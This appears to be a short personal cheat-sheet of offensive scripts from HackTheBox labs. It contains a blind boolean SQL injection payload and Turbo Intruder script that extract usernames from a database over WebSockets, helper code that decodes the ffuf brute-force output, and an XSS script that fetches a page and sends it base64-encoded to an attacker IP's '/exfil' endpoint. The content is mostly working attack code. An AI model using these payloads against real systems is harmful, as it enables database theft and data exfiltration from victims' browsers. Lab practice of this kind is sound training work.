# Scripts

## SQLi

### Converting Blind Boolean ffuf output to ASCII

`ffuf -request request.txt -request-proto http -w ../../scripts/num.txt:HFUZZ -w ../../scripts/charlist.txt:WFUZZ -fw 73`

<div align="left"><figure><img src="../../.gitbook/assets/image (6).png" alt="" width="506"><figcaption></figcaption></figure></div>

```bash
cat output | grep '*' > newoutput
```

```python
file=open("newoutput","r")
dic = {}
while True:
    keyv = file.readline()
    if not keyv:
        break
    key = keyv.split(':')[1].replace("\n","").strip()
    valv = file.readline()
    val = valv.split(':')[1].replace("\n","").strip()
    dic[key]=val


l = [0] * len(dic)
for i in range(1,len(dic)+1):
    l[i-1] = dic[str(i)]
text = ''.join(chr(int(value)) for value in l)
print(text)
```

### WebSockets Blind Boolean&#x20;

```python
#Body in Request Panel of WebSocket Turbo Intruder
{
"id": "0 OR MID((SELECT username FROM soccer_db.accounts LIMIT 0,1),$1,1)='$2'"
}

import time
def queue_websockets(upgrade_request, message):
    connection1 = websocket_connection.create(upgrade_request)
    template = message
    with open('/home/jtripz/htb/scripts/smallcharlist.txt') as file: 
        for i in range(1,10):
            for line in file:
                time.sleep (0.17)
                payload = build_payload(template,str(i), line.strip())
                connection1.queue(payload)
            file.seek(0)

def build_payload (template, *args):
    return_payload = template
    for i in range (0, len(args)):
        return_payload = return_payload.replace('$'+str(i+1), args[i])
    return return_payload
    

def handle_outgoing_message(websocket_message):
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message):
    if websocket_message.getLength()==13:
        results_table.add(websocket_message)
```

## JS

### Fetch File via XSS

```javascript
<script>
fetch('http://alert.htb/messages.php')
.then(resp => resp.text())
.then(body => {
    fetch("http://10.10.14.6/exfil?body=" + btoa(body));
})
</script>
```
